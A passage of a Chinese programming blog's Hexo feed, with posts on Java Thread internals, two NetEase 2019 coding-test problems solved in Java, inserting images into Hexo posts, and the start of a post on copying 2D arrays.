&#125;<br></code></pre></td></tr></table></figure><p>emmm,它用同样的方式调用了一个参数更全的init方法。于是我们找到了Thread线程构造方法的核心部分。发现构造函数的target正是赋值给了run()方法执行的target。证明了之前的想法。<br>所以说<b>资源共享的本质是，多个线程调用同一个对象的run()方法。</b>那么我们的问题已经有了答案。<br>但来都来了，顺便瞧一下构造一个Thread最多都需要哪些参数吧。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>     * Initializes a Thread.<br>     *<br>     * @param g the Thread group<br>     * @param target the object whose run() method gets called<br>     * @param name the name of the new Thread<br>     * @param stackSize the desired stack size for the new thread, or<br>     *        zero to indicate that this parameter is to be ignored.<br>     * @param acc the AccessControlContext to inherit, or<br>     *            AccessController.getContext() if null<br>     * @param inheritThreadLocals if &#123;@code true&#125;, inherit initial values for<br>     *            inheritable thread-locals from the constructing thread<br>     *&#x2F;<br>    private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize, AccessControlContext acc,<br>                      boolean inheritThreadLocals) &#123;<br>       &#x2F;&#x2F;...<br>       &#x2F;&#x2F;当然要包含这句<br>        this.target &#x3D; target;<br>       &#x2F;&#x2F;...<br>    &#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th align="left">含义</th></tr></thead><tbody><tr><td>ThreadGroup g</td><td align="left">设置这个线程的线程组</td></tr><tr><td>Runnable target</td><td align="left">这个线程要执行操作的对象，run()所在的对象。</td></tr><tr><td>String name</td><td align="left">设置线程名</td></tr><tr><td>long stackSize</td><td align="left">设定线程栈的大小，就是这个线程在JVM里栈的大小。</td></tr><tr><td>AccessControlContext acc</td><td align="left">权限控制上下文，不是很懂–<a href="https://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/" target="_blank" rel="noopener">Java安全模型</a></td></tr><tr><td>boolean inheritThreadLocals</td><td align="left">可继承的ThreadLocal</td></tr></tbody></table><p>又看了看Thread的start方法，发现Thread的start方法调用了一个名为start0的本地方法。<br>而该Thread的run()法执行target的run()方法。所以要执行这个线程.run()也就是执行了target.run()。不过并没有新建真正的线程，只是执行了这个方法而已。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：瞌睡</title>
      <link href="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/"/>
      <url>/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>小易觉得高数课太无聊了，决定睡觉。不过他对课上的一些内容挺感兴趣，所以希望你在老师讲到有趣的部分的时候叫醒他一下。你知道了小易对一堂课每分钟知识点的感兴趣程度，并以分数量化，以及他在这堂课上每分钟是否会睡着，你可以叫醒他一次，这会使得他在接下来的k分钟内保持清醒。你需要选择一种方案最大化小易这堂课听到的知识点分值。</p><a id="more"></a><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><p>第一行 n, k (1 &lt;= n, k &lt;= 105) ，表示这堂课持续多少分钟，以及叫醒小易一次使他能够保持清醒的时间。<br>第二行 n 个数，a1, a2, … , an(1 &lt;= ai &lt;= 104) 表示小易对每分钟知识点的感兴趣评分。<br>第三行 n 个数，t1, t2, … , tn 表示每分钟小易是否清醒, 1表示清醒。</p><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><p>小易这堂课听到的知识点的最大兴趣值。</p><p>示例<br>输入</p><p>6 3<br>1 3 5 2 5 4<br>1 1 0 1 0 0<br>1<br>2<br>3<br>输出</p><p>16</p><h3 id="最初解题思路"><a href="#最初解题思路" class="headerlink" title="最初解题思路"></a>最初解题思路</h3><ol><li>把兴趣值和是否醒着储存到一个二维数组。</li><li>复制这个二维数组，按顺序修改数组，模拟每次被叫醒的状态，统计总兴趣值。</li><li>找出总兴趣值中的最大值，输出。</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>&#x2F;&#x2F;用于储存每种叫醒情况的总兴趣值<br>        int[] scores&#x3D;new int[n];<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>        &#x2F;&#x2F;克隆原数组<br>            int scoremapClone[][] &#x3D; new int[scoremap.length][];<br>            for(int j&#x3D;0;j&lt;scoremap.length;j++)&#123;<br>                scoremapClone[j]&#x3D;scoremap[j].clone();<br>            &#125;<br>            &#x2F;&#x2F;模拟叫醒<br>            for(int j&#x3D;0;j&lt;k;j++)&#123;<br>                if(i+j&lt;n)&#123;<br>                    scoremapClone[i+j][0]&#x3D;1;<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;计算总兴趣值，并储存<br>            for(int j&#x3D;0;j&lt;n;j++)&#123;<br>                if(scoremapClone[j][0]&#x3D;&#x3D;1)&#123;<br>                    scores[i]+&#x3D;scoremapClone[j][1];<br>                &#125;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;找出最大值<br>        int max &#x3D; Arrays.stream(scores).max().getAsInt();<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/真叫人头大.jpg" alt style="width:100px;height:100px" align="right"><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>AC 0.5 ，运行超时。<br>反思：克隆数组花费了大量时间，其实可以不模拟每次修改后的状态，只做实时运算。于是对代码做出改进。<br>其实每次的运算结果也不用都保存起来，最后再取最大值。只要保存一个当前最大值就可以了。</p><h3 id="改进版思路"><a href="#改进版思路" class="headerlink" title="改进版思路"></a>改进版思路</h3><p>把兴趣值和是否醒着储存到一个二维数组。<br>实时计算每次叫醒可以获得的兴趣值，如果大于max（初始化为0）则储存到max。<br>加上固定兴趣值，输出结果。</p><h3 id="改进版代码"><a href="#改进版代码" class="headerlink" title="改进版代码"></a>改进版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n&#x3D; sc.nextInt();<br>        int k&#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n&amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;加上固定兴趣值成为总兴趣值<br>        for(int j&#x3D;0;j&lt;n;j++)&#123;<br>            if(scoremap[j][0]&#x3D;&#x3D;1)&#123;<br>                max+&#x3D;scoremap[j][1];<br>            &#125;<br>        &#125;<br>        System.out.println(max);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>AC 0.9 ，运行超时！！！<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/嗯.jpg" alt style="width:110px;height:100px"><br>WTF!!!容老夫再想想。<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/盲目分析.jpg" alt style="width:100px;height:100px"><br>想到的优化方式：</p><ol><li>计算固定兴趣值这部分，其实可以在输入的同时计算，这样就少一个次数为N的循环。<br>（结果改了这个还是AC 0.9,于是又做出了下面的改进）</li><li>当宽度为n的滑动窗口超出k的范围时，所得到的兴趣值会逐渐减少。所以可以取消循环中（i&gt;n-k+1）这部分。</li></ol><h3 id="最终版思路"><a href="#最终版思路" class="headerlink" title="最终版思路"></a>最终版思路</h3><p>其实和上面是一样的，不过从代码逻辑上和思路逻辑上分别减少了一些多余的操作。</p><h3 id="最终版代码"><a href="#最终版代码" class="headerlink" title="最终版代码"></a>最终版代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br><br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        Scanner sc &#x3D; new Scanner(System.in);<br>        int n &#x3D; sc.nextInt();<br>        int k &#x3D; sc.nextInt();<br>        int[][] scoremap &#x3D; new int[n][2];<br>        &#x2F;&#x2F;最大兴趣值<br>        int stable &#x3D; 0;<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][1]&#x3D;sc.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;在输入的同时储存固定兴趣值到max<br>        for(int i &#x3D; 0; i &lt; n; i++)&#123;<br>            scoremap[i][0]&#x3D;sc.nextInt();<br>            if(scoremap[i][0]&#x3D;&#x3D;1)&#123;<br>                stable+&#x3D;scoremap[i][1];<br>            &#125;<br>        &#125;<br>        &#x2F;&#x2F;最大兴趣值<br>        int max &#x3D; 0;<br>        for(int i&#x3D;0;i&lt;n-k+1;i++)&#123;<br>            &#x2F;&#x2F;储存当前叫醒可获得的兴趣值<br>            int cur &#x3D; 0;<br>            &#x2F;&#x2F;计算叫醒可以获得的兴趣值<br>            for(int j&#x3D;0;j&lt;k;j++) &#123;<br>                if (i + j &lt; n &amp;&amp; scoremap[i + j][0] &#x3D;&#x3D; 0) &#123;<br>                    cur +&#x3D; scoremap[i + j][1];<br>                &#125;<br>            &#125;<br>            &#x2F;&#x2F;如果大于max则储存到max<br>            if(cur&gt;max)&#123;<br>                max &#x3D; cur;<br>            &#125;<br>        &#125;<br>        System.out.println(max+stable);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>AC 1.0。 NICE，此题完结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>想想自己写的那个最初版代码真是<br><img src="/2018/09/11/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%9E%8C%E7%9D%A1/09/11/【编程题】网易2019笔试：瞌睡/写的什么垃圾.jpg" alt style="width:110px;height:100px"></p><ul><li>遇到题目不要总想着暴力破解。即使计算机性能强大，但实际上，当遇到某些输入量较大并且时间复杂度- 较高的程序，运行时间会明显增加。</li><li>一定尽量避免重复或者无效代码，可以实时运算的部分就不要占用储存空间。</li><li>对程序尽可能的优化，任意一点优化都可能对结果产生影响。</li><li>看到题目先在纸上画图分析一遍，对整理思路非常有帮助！</li><li>Java8中引入了Stream的概念，对于基本数值型，目前有三种对应的包装类型 Stream：IntStream、LongStream、DoubleStream。用Arrays.stream()方法可以获得一个Stream,本题第一个程序中使用了Stream.max()方法。关于Stream的更多使用可以看<a href="http://www.runoob.com/java/java8-streams.html" target="_blank" rel="noopener">这里</a>。给自己挖个坑= =</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编程题】网易2019笔试：牛牛找工作</title>
      <link href="/2018/09/09/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%89%9B%E7%89%9B%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
      <url>/2018/09/09/%E3%80%90%E7%BC%96%E7%A8%8B%E9%A2%98%E3%80%91%E7%BD%91%E6%98%932019%E7%AC%94%E8%AF%95%EF%BC%9A%E7%89%9B%E7%89%9B%E6%89%BE%E5%B7%A5%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>做了很多次笔试，编程题总是不能在规定时间内完成。一个原因是算法图的部分没有看。还有一个原因是题做得太少。今天开始打算有空的时候整理一下做过的编程题。总结一下知识点，也对自己的做题历程做一个记录。。。</p><a id="more"></a><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。<br>输入描述:<br>每个输入包含一个测试用例。<br>每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。<br>接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。<br>接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。<br>保证不存在两项工作的报酬相同。</p><p>输出描述:<br>对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。<br>示例1<br>输入<br>3 3<br>1 100<br>10 1000<br>1000000000 1001<br>9 10 1000000000<br>输出<br>100<br>1000<br>1001</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>首先将工作难度和对应薪资储存在二维数组，按能力要求增序排序。</li><li>排序后需要更新每个难度下的薪资为 可获得的最大值(因为可能存在能力要求高的工作薪资反而低的情况)。</li><li>用二分查找确定能胜任的最大工作难度及其最大报酬。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br>public class Main &#123;<br>    public static void main(String[] args)&#123;<br>        Scanner scanner &#x3D; new Scanner(System.in);<br>        int N&#x3D;scanner.nextInt();<br>        int M&#x3D;scanner.nextInt();<br>        int[][] jobmap&#x3D; new int[N][2];<br>        for(int i&#x3D;0;i&lt;N;i++)&#123;<br>            jobmap[i][0]&#x3D;scanner.nextInt();<br>            jobmap[i][1]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;将 薪资-能力 二维数组按能力要求增序排序<br>        Arrays.sort(jobmap,(int[] o1, int[] o2) -&gt;  o1[0]-o2[0]);<br>        &#x2F;&#x2F;排序后需要更新每个ability下的薪资为 可获得的最大值(如果低能力要职位的求薪资高于高能力要求职位的薪资，则更新高能力要求职位的薪资为高薪资)<br>        for (int i &#x3D; 0; i &lt; jobmap.length - 1; i++) &#123;<br>            if (jobmap[i][1] &gt; jobmap[i + 1][1]) &#123;<br>                jobmap[i + 1][1] &#x3D; jobmap[i][1];<br>            &#125;<br>        &#125;<br>        int[] people &#x3D; new int[M];<br>        for(int i&#x3D;0;i&lt;M;i++)&#123;<br>            people[i]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F; 二分查找确定能胜任的最大工作难度及其最大报酬<br>        for (int i &#x3D; 0; i &lt; people.length; i++) &#123;<br>            int index &#x3D; Arrays.binarySearch(jobmap, new int[] &#123;people[i], 0&#125;, (int[] jd1, int[] jd2) -&gt;jd1[0] - jd2[0]);<br>            index &#x3D; index &lt; 0 ? -(index + 1) - 1: index;<br>            System.out.println(index &gt;&#x3D; 0 ? jobmap[index][1] : 0);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>在初次编写代码的时候没有考虑到不一定报酬和工作难度都成正比。考虑不周全，需要注意。</li><li>在初次编写代码的时候，每个人都对所有工作进行遍历查找一次，时间复杂度为O(n²)。在数据量较大时性能不高，导致超时。改为二分查找后时间复杂度为O(log2(n))。</li><li>在使用Arrays.sort(T[] a, Comparator&lt;? super T&gt; c)方法时,使用了lambda表达式替代了匿名内部类。注意返回参数一减参数二的值是增序。</li><li>在使用Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)时也使用了lambda表达式，在使用该方法前需要先使用sort方法排序。当查询的Key存在时，这个方法返回key在该数组中的下标，否则返回(-(insertion point) - 1)，insertion point指的是key在这个数组中应该插入的位置。也就是第一个比key大的值的下标，当key比所有值都大的时候，返回数组长度。所以当且仅当查找到key时，该方法的返回值才是正数。所以我们要寻找的最大报酬的工作的下标为 -(index + 1) - 1。</li></ul><blockquote><p>Java API中对Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)返回值的描述</p></blockquote><p>index of the search key, if it is contained in the array; otherwise, (-(insertion point) - 1). The insertion point is defined as the point at which the key would be inserted into the array: the index of the first element greater than the key, or a.length if all elements in the array are less than the specified key. Note that this guarantees that the return value will be &gt;= 0 if and only if the key is found.</p>]]></content>
      
      
      <categories>
          
          <category> 编程题 </category>
          
          <category> 笔试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我翻译的文章在这里</title>
      <link href="/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/"/>
      <url>/2018/09/08/%E6%88%91%E7%BF%BB%E8%AF%91%E7%9A%84%E6%96%87%E7%AB%A0%E5%9C%A8%E8%BF%99%E9%87%8C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/user/1206354/articles" target="_blank" rel="noopener">这里是我腾讯云+社区的个人中心</a>，里面有我翻译的几篇文章。<br>虽然并不是专业的翻译，不过收到赞和关注的时候还是小有成就感&gt;&lt;。</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Hexo文章中插入图片</title>
      <link href="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>在写上一篇博客的时候，发现不知道该怎么往文章中插入图片，于是在网上搜。答案来来回回就那么两篇。于是就打开一个照着步骤做。</p><a id="more"></a><p>然后在操作的过程中，踩到了各种奇奇怪怪的坑。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic01.jpg" alt><br>汪的一声就哭了<br>虽然在自己的不懈努力下<br>最后终于显示成功了。<br>可是，你不就一个低画质表情包吗！为什么显示这么大！！<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt><br>觉得可能是hexo主题的问题。既然这样，只能修改CSS。可是主题CSS一改，所有图片的样式都会受到影响。<br>在一番搜索过后，发现hexo可以直接使用img标签,在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。然后把样式写在img标签里面。<br>すると：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic02.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot;&gt;<br></code></pre></td></tr></table></figure><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt style="width:100px;height:100px"><p>完美解决问题。当然，我的第一种插入图片方法只需要下面这几步。</p><ol><li><p>安装插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-asset-image --save<br></code></pre></td></tr></table></figure></li><li><p>在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。</p></li><li><p>在md文件中使用 !(图片描述)[xxx.png]</p></li><li><p>hexo g -d 重新发布</p></li></ol><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic04.jpg" alt style="width:100px;height:100px;float:left;display:block"><p>如果出了意外，那就去Google吧。。</p><p> 顺便，在我不断地重新发布并查看页面的时候。明明源码已经修改过来，可是网页上显示的页面还是不变。一定是缓存的问题。于是我清空浏览器缓存，果真OK了。</p><p> 可是！每次调试都要清缓存真的好麻烦。。。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic03.jpg" alt style="width:100px;height:100px" align="right"><br> 好在我发现了ctrl+F5 这个清缓存刷新的神奇快捷键。。。<br> 如果有遇到需要经常清缓存刷新的，这样方便多了。。<br>nice，插入图片已经不是问题了。<br>顺便,👇用这种方法可以把图片显示在文字右边，就像这样👉</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic03.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot; align&#x3D;&quot;right&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中二维数组的复制（深拷贝与浅拷贝）</title>
      <link href="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/"/>
      <url>/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最近在做一道编程题的时候出现了一处bug。在这道题需要使用多种方法对同一个二维数组进行更改，找出使第二列数之和最大的更改方法。所以每次修改之前，我对原数组进行拷贝，修改的是数组的拷贝。可是程序写完之后，运行结果却出乎意料的是错误的。看了几遍程序流程，觉得逻辑上没有错误。于是打开debug模式一步步看数值变化。调试时发现在第二次循环中，数组本该为0的位置，值却被改成了1,而这是第一次进行修改的结果。此时顿悟，想起很久之前学过的深拷贝和浅拷贝，绝对是clone()的问题。</p><a id="more"></a><p>我们重现一下当时的问题，上代码：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 